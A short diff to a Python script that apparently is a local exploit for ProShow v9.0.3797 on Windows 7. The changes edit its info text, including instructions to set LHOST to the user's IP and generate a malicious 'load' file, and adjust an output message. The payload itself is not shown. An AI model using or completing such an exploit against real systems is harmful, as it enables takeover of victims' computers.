@@ -3,7 +3,12 @@
 
 from struct import pack
 
-informacion = """"
+informacion = """
+
+	ProShow v9.0.3797
+	http://www.photodex.com/ProShow
+
+
 	change the LHOST for your IP
 	execute exploit
 	create a file called "load"
@@ -13,13 +18,7 @@ informacion = """"
 
 	Testing: Windows 7
 	@Yonatan_Correa
-	risataim.blogspot.com
-
-	ProShow v9.0.3797
-	http://www.photodex.com/ProShow
-	http://files.photodex.com/release/pspro_90_3797.exe
-	Reference: https://www.exploit-db.com/exploits/24872
-
+	https://risataim.blogspot.com/2019/06/exploit-local-para-proshow.html
 """
 
 
@@ -88,5 +87,5 @@ arch = open("load", "wb")
 arch.write(todo)
 arch.close()
 
-print "\nCreated File\n"
 print informacion
+print "\nCreated File size " + str(len(todo))
